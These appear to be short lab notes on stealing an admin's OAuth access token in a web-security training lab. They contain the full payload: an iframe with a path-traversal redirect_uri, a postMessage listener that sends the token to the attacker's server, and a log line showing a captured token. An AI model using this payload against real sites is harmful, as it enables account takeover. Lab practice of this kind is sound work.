Lab #6 – Stealing OAuth access tokens via a proxy page

Vulnerable functionality - OAuth implementation.

Goal - Exploit the secondary vulnerability and steal the admin's access token.

creds - wiener:peter

Analysis:

<iframe src="https://oauth-0ae200e40462a6e49c4338ee0282007c.oauth-server.net/auth?client_id=lj4dirktui466zd7esdb6&redirect_uri=https://0add00ab04e2a68f9cd73a6100de00a4.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=2131211617&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener(
        'message', function(e){
            fetch("/" + encodeURIComponent(e.data.data))
        }, 
    false)
</script>

a6100de00a4.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3Dhtb-cn-Pyjn2e67CCD_rvEw1eHqh0cnvA1UU9lI3F0t%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36



